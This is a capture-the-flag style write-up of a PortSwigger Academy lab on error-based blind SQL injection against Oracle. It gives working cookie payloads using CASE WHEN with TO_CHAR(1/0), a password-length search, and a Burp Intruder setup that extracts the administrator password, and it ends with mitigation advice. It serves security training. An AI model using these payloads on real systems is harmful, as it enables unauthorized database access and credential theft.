# Blind SQL Injection with Conditional Errors (Oracle)

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection (Blind - Error-Based)  
**Difficulty:** Practitioner  
**Date:** March 2026

---

## Objective

Exploit a blind SQL injection vulnerability using **conditional errors** to extract the administrator password character by character on an Oracle database.

---

## Vulnerability

The application uses a tracking cookie vulnerable to SQL injection on an **Oracle database**. Unlike Lab 12 where "Welcome back" provided a boolean signal, this application shows **no visible difference** in normal responses. The only signal is **database errors** (HTTP 500) vs normal responses (HTTP 200).

**Backend Query (Oracle):**
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'USER_COOKIE_VALUE'
```

**Developer Mistake:**  
- **Cookie value not sanitized** on Oracle database
- **Error messages not suppressed** — 500 errors leak information
- **No prepared statements** for tracking functionality
- **Oracle-specific syntax** not secured

**The Key Challenge:** The application response looks identical whether the query returns data or not. We must **manufacture our own signal** by deliberately triggering database errors.

---

## Understanding Error-Based Blind SQLi

### The Problem:

| Lab 12 (Boolean-Based) | Lab 13 (Error-Based) |
|------------------------|----------------------|
| "Welcome back" appears/disappears | **No visible difference in content** |
| TRUE → message shows | TRUE → trigger **database error** |
| FALSE → message hidden | FALSE → no error |
| **Needs behavior change** | **Creates its own signal** |

### The Solution: CASE WHEN

We use SQL's `CASE WHEN` statement to conditionally trigger errors:

```sql
CASE WHEN (condition) THEN error_trigger ELSE normal_value END
```

**The Logic:**
- **TRUE condition** → CASE returns `1/0` → divide by zero → **500 error** ✅
- **FALSE condition** → CASE returns `''` → no error → **200 OK** ❌

This transforms an "invisible" vulnerability into an exploitable one by creating our own TRUE/FALSE signal.

---

## Oracle-Specific Syntax

### Why String Concatenation (`||`)?

Unlike previous labs using `AND`, Oracle injection requires **string concatenation**:

```sql
-- ❌ Previous approach (doesn't work well on Oracle)
TrackingId=xyz' AND (subquery)--

-- ✅ Oracle approach (string concatenation)
TrackingId=xyz'||(subquery)||'
```

**Why:** Oracle is strict about query structure. String concatenation (`||`) appends the subquery result as a string operation, which Oracle handles more reliably.

### Why `TO_CHAR(1/0)`?

In Oracle, `CASE` expressions must return **matching data types**. Since we're returning empty strings (`''`), we must convert the division to string format:

```sql
-- ❌ Type mismatch error
CASE WHEN (1=1) THEN 1/0 ELSE '' END

-- ✅ Correct - both branches return strings
CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
```

**Database-Specific Error Triggers:**

| Database | Error Trigger | Syntax |
|----------|---------------|--------|
| **Oracle** | Division + string conversion | `TO_CHAR(1/0)` |
| MySQL | Simple division | `1/0` |
| PostgreSQL | Division or type cast | `1/0` or `CAST('a' AS int)` |
| MSSQL | Division or conversion | `1/0` or `CONVERT(int,'a')` |

---

## My Attack Methodology

### 🔵 Step 1: Confirm Oracle Database

**Payload:**
```sql
'||(SELECT '' FROM dual)||'
```

**Cookie:**
```
Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||'; session=...
```

**Why this step:**
- `dual` is Oracle's built-in dummy table
- Only exists on Oracle databases
- Confirms database type

**Result:** ✅ 200 OK (no error)

**Conclusion:** Oracle database confirmed!

---

### 🔵 Step 2: Confirm `users` Table and Administrator Exist

**Payload:**
```sql
'||(SELECT '' FROM users WHERE username='administrator')||'
```

**Cookie:**
```
Cookie: TrackingId=xyz'||(SELECT '' FROM users WHERE username='administrator')||'; session=...
```

**Why this step:**
- Confirms `users` table exists
- Confirms `administrator` account exists
- No error = both confirmed

**Result:** ✅ 200 OK (no error)

**Conclusion:** Table and user confirmed!

---

### 🔵 Step 3: Confirm Error Mechanism (TRUE Condition)

**Payload:**
```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Cookie:**
```
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=...
```

**Breaking down the logic:**
```sql
CASE WHEN (1=1)           -- TRUE condition
THEN TO_CHAR(1/0)         -- Trigger divide-by-zero error
ELSE ''                   -- Return empty string
END
```

**Result:** ⚠️ **500 Internal Server Error**

**Conclusion:** TRUE conditions trigger errors! Signal confirmed! ✅

---

### 🔵 Step 4: Confirm FALSE Condition (No Error)

**Payload:**
```sql
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Cookie:**
```
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=...
```

**Breaking down the logic:**
```sql
CASE WHEN (1=2)           -- FALSE condition
THEN TO_CHAR(1/0)         -- Not executed
ELSE ''                   -- Return empty string
END
```

**Result:** ✅ 200 OK (no error)

**Conclusion:** FALSE conditions return normal! Oracle confirmed working! ✅

**Our Signal:**
- **500 error** = TRUE ✅
- **200 OK** = FALSE ❌

---

### 🔵 Step 5: Find Password Length

**Testing payloads (binary search):**

```sql
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
⚠️ 500 ERROR → password > 1 character

```sql
'||(SELECT CASE WHEN LENGTH(password)>10 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
⚠️ 500 ERROR → password > 10 characters

```sql
'||(SELECT CASE WHEN LENGTH(password)>15 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
⚠️ 500 ERROR → password > 15 characters

```sql
'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
⚠️ 500 ERROR → password > 20 characters

```sql
'||(SELECT CASE WHEN LENGTH(password)>21 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
✅ 200 OK → password NOT > 21 characters

```sql
'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
⚠️ 500 ERROR → password is exactly 20 characters!

**Conclusion:** Password length = **20 characters**

---

### 🔵 Step 6: Extract Password Character by Character

**Base payload for extraction:**
```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Note:** Oracle uses `SUBSTR()` not `SUBSTRING()`

**How it works:**
- **500 error** = character matches ✅
- **200 OK** = character doesn't match ❌

---

**Using Burp Suite Intruder:**

**Payload setup:**
```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Attack type:** Cluster Bomb

**Payload Set 1 (positions):**
```
1, 2, 3, 4, 5, ..., 20
```

**Payload Set 2 (characters):**
```
a b c d e f g h i j k l m n o p q r s t u v w x y z
0 1 2 3 4 5 6 7 8 9
```

**Grep Match:**
- Look for **HTTP 500** responses (errors = correct character)
- Filter out **HTTP 200** responses (no error = wrong character)

**Total requests:** 20 positions × 36 characters = 720 requests

---

**Extracted Password:**
```
z9hw0clt0ag9svk2zd5l
```

**Character-by-character extraction:**
```
Position 1:  z  (500 error on 'z')
Position 2:  9  (500 error on '9')
Position 3:  h  (500 error on 'h')
Position 4:  w  (500 error on 'w')
Position 5:  0  (500 error on '0')
Position 6:  c  (500 error on 'c')
Position 7:  l  (500 error on 'l')
Position 8:  t  (500 error on 't')
Position 9:  0  (500 error on '0')
Position 10: a  (500 error on 'a')
Position 11: g  (500 error on 'g')
Position 12: 9  (500 error on '9')
Position 13: s  (500 error on 's')
Position 14: v  (500 error on 'v')
Position 15: k  (500 error on 'k')
Position 16: 2  (500 error on '2')
Position 17: z  (500 error on 'z')
Position 18: d  (500 error on 'd')
Position 19: 5  (500 error on '5')
Position 20: l  (500 error on 'l')
```

---

### 🔵 Step 7: Log In as Administrator

**Credentials:**
- Username: `administrator`
- Password: `z9hw0clt0ag9svk2zd5l`

**Result:** ✅ Lab solved!

---

## Complete Attack Flow Visualization

```
Step 1: Confirm Oracle database
        '||(SELECT '' FROM dual)||'  →  ✅ 200 OK
        ↓
Step 2: Confirm users table + administrator
        WHERE username='administrator'  →  ✅ 200 OK
        ↓
Step 3: Confirm error on TRUE
        CASE WHEN (1=1) THEN TO_CHAR(1/0)  →  ⚠️ 500 ERROR
        ↓
Step 4: Confirm no error on FALSE
        CASE WHEN (1=2) THEN TO_CHAR(1/0)  →  ✅ 200 OK
        ↓
        Oracle confirmed! Signal works!
        ↓
Step 5: Find password length
        LENGTH(password)=20  →  ⚠️ 500 ERROR (confirmed)
        ↓
Step 6: Extract char-by-char (Burp Cluster Bomb)
        SUBSTR(password,1,1)='z'  →  ⚠️ 500 ERROR (match!)
        SUBSTR(password,2,1)='9'  →  ⚠️ 500 ERROR (match!)
        ... (720 requests total)
        ↓
        Password: z9hw0clt0ag9svk2zd5l
        ↓
Step 7: Authenticate
        🎯 Lab solved!
```

---

## Comparison: Lab 12 vs Lab 13

### Side-by-Side Comparison:

| Aspect | Lab 12 (Boolean-Based) | Lab 13 (Error-Based) |
|--------|------------------------|----------------------|
| **Signal** | "Welcome back" message | HTTP 500 errors |
| **Database** | PostgreSQL/MySQL | Oracle |
| **TRUE indicator** | Message appears | 500 error |
| **FALSE indicator** | No message | 200 OK |
| **Injection style** | `' AND ...` | `'\|\|(...)\|\|'` |
| **Function used** | `SUBSTRING()` | `SUBSTR()` |
| **Error trigger** | N/A | `TO_CHAR(1/0)` |
| **Dummy table** | Not needed | `FROM dual` |
| **Visible difference** | Yes (message) | No (must create signal) |

---

## What I Learned

1. **Error-based SQLi creates its own signal** — manufacturing TRUE/FALSE from errors
2. **CASE WHEN is the weapon** — conditional logic triggers errors selectively
3. **Oracle requires string conversion** — `TO_CHAR(1/0)` for type matching
4. **String concatenation on Oracle** — `||` instead of `AND` for injection
5. **HTTP status codes as oracle** — 500 vs 200 is just as good as visible text
---

## Mitigation

**For Developers:**
- Use **parameterized queries** — prevents all SQL injection types
- Apply **error handling** that doesn't leak information
- **Log errors securely** — don't expose stack traces
- Implement **rate limiting** on error responses

**Example Fix (Python):**
```python
# ❌ Vulnerable
query = f"SELECT * FROM tracked_users WHERE tracking_id = '{cookie}'"

# ✅ Secure
query = "SELECT * FROM tracked_users WHERE tracking_id = :id"
cursor.execute(query, id=cookie)
```
